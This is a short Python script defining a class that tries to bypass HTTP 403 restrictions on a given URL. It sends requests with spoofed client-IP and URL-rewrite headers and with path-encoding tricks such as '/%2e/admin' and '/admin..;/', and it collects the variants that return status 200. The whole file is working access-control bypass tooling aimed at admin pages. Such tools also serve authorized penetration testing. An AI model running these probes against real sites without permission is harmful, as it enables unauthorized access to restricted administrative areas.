import requests

class Bypass403:
    def __init__(self, target_url):
        self.target_url = target_url.rstrip('/')
        self.headers_to_test = [
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Forwarded-Host": "localhost"},
            {"X-Custom-IP-Authorization": "127.0.0.1"},
            {"X-Original-URL": "/admin"},
            {"X-Rewrite-URL": "/admin"},
            {"X-Remote-IP": "127.0.0.1"},
            {"X-Remote-Addr": "127.0.0.1"}
        ]
        self.paths_to_test = [
            "/%2e/admin",
            "/./admin",
            "/admin/.",
            "/admin/..;/",
            "/admin..;/",
            "/admin?debug=true"
        ]

    def run(self):
        results = []
        print(f"[*] Testing 403 Bypasses for {self.target_url}...")
        
        # Test Headers
        for header in self.headers_to_test:
            try:
                r = requests.get(self.target_url, headers=header, timeout=5)
                if r.status_code == 200:
                    results.append({"type": "Header Bypass", "payload": str(header), "status": 200})
            except:
                continue

        # Test Paths
        for path in self.paths_to_test:
            try:
                url = f"{self.target_url}{path}"
                r = requests.get(url, timeout=5)
                if r.status_code == 200:
                    results.append({"type": "Path Bypass", "payload": path, "status": 200})
            except:
                continue
        
        return results
